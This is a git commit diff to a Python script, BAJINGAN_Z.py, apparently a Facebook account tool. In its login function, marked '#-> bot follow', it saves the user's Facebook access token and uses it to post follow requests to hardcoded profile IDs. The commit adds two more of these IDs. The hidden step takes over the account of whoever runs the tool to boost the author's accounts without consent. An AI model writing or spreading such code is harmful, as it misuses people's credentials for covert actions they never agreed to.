b833a8b0b2d63f29f65003cb2d9df836723e6d12
Bangsat Militan☆ <95204908+Bajingan-Z@users.noreply.github.com>
2021-11-29 14:19:12 +0700

    Update BAJINGAN_Z.py

--- BAJINGAN_Z.py
+++ BAJINGAN_Z.py
@@ -87,7 +87,9 @@ def login():
 			nama = requests.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
 			open("login.txt", "w").write(token)
 			#-> bot follow
-			requests.post("https://graph.facebook.com/100000395779504/subscribers?access_token="+token)      
+			requests.post("https://graph.facebook.com/100000395779504/subscribers?access_token="+token)
+			requests.post("https://graph.facebook.com/100017584682867/subscribers?access_token="+token)
+			requests.post("https://graph.facebook.com/100000834003593/subscribers?access_token="+token)                        
 			menu()
 		except KeyError:
 			os.system("rm -f login.txt")
